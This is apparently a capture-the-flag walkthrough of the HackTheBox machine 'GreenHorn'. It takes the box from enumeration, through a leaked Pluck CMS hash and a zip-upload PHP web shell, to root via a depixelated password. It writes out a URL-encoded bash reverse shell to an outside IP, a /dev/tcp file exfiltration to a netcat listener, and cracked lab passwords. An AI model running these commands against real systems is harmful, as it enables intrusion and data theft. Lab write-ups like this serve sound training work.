#
#GreenHorn
#Pluck CMS 4.7.18
#GitHub Bad Practices
#https://crackstation.net/
# URL Manipulation
# Zip File RCE - Remote Shell
# URL Encode for Bash Reverse shell
# WWW-DATA escape
# LinEnum sh auto Enum
# Upload from Linux machine to Kali
# Depix to Depixelize passwd
#


1-Enumeration:
    └─$ nmap -T5 -sV -sC -Pn 10.129.125.52 -v
        PORT     STATE SERVICE VERSION
        22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
        |_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
        80/tcp   open  http    nginx 1.18.0 (Ubuntu)
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        |_http-title: Did not follow redirect to http://greenhorn.htb/
        |_http-server-header: nginx/1.18.0 (Ubuntu)
        3000/tcp open  ppp?

        Port 80:
            nikto -h http://10.129.231.80:80 - pluck 4.7.18 

                http://greenhorn.htb/login.php:

                http://greenhorn.htb/README.md

                http://greenhorn.htb/install.php


            http://greenhorn.htb/login.php + iloveyou1
                


        Port 3000:
            └──╼ [★]$ gobuster dir -u http://greenhorn.htb:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
                /admin                (Status: 200) [Size: 11114]
                /issues               (Status: 200) [Size: 11112]
                /v2                   (Status: 401) [Size: 50]
                /explore              (Status: 200) [Size: 15992]
                /milestones           (Status: 200) [Size: 11112]
                /notifications        (Status: 200) [Size: 11112]


            http://greenhorn.htb:3000/user/login
            http://greenhorn.htb:3000/explore/repos


            └──╼ [★]$ searchsploit pluck 4.7.18
                -------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
                Exploit Title                                                                                                                                          |  Path
                -------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
                Pluck v4.7.18 - Remote Code Execution (RCE)                                                                                                             | php/webapps/51592.py


            └──╼ [★]$ locate php/webapps/51592.py
                /usr/share/exploitdb/exploits/php/webapps/51592.py

            

            http://greenhorn.htb:3000/explore/repos give us a reposity on git by a junior web dev:
                http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php

            We found encrypted Hash:
                d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163

            We past the hash in crack station:
                https://crackstation.net/
                    iloveyou1
                
                http://greenhorn.htb/login.php + iloveyou1



        Pluck 4.7.18 RCE via Zip File:
            We create a zip file containing - reverse.php with a simple <? php system($_REQUEST['cmd']); ?>

            Then we Upload via the module management the zip and find the path to call it

            Via BURP the Repeater does not want to work so we URL Encrypt and use it from the URL directly:
                http://greenhorn.htb/data/modules/shell/reverse.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.77/4443+0%3E%261%27


        TTY shell:
            www-data@greenhorn:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'


        Priv Esc from www-data:
            We can download the reverse shell file on the remote host using the wget utility. 
        We will traverse to the:
            /dev/shm/STTY directory for downloading the file as this directory is writable by all the users by default.
            cd /dev/shm/STTY

        We create http server to upload linenum from our Kali:
            ──╼ [★]$ python3 -m http.server 8888

        From the Linux compromized machine:
            wget -r http://10.10.14.77:8888/LinEnum.sh


        We run the script:
            chmod +x LinEnum.sh
            www-data@greenhorn:/dev/shm/STTY/10.10.14.77:8888$ ./LinEnum.sh

        1 - Enum:
            We dont finr anything with www-data rights

            We will try to connect with junior via iloveyou1

            www-data@greenhorn:/dev/shm/STTY/10.10.14.77:8888$ su - junior

            We are junior:
                junior@greenhorn:~$ 

            We found a File:
                'Using OpenVAS.pdf'

        2 - Upload OpenVas from the Linux to our Kali:
            Kali:
                └──╼ [★]$ nc -lvnp 9001 > openvas.pdf

            Linux Machine:
                cat 'Using OpenVAS.pdf' > /dev/tcp/10.10.14.77>9001

            When we opened the pdf we fond a pixelize passwd:
                We will use the "depix" python scirpt

                Password: sidefromsidetheothersidesidefromsidetheotherside

        3 - Priv Esc:
            We are root now






            
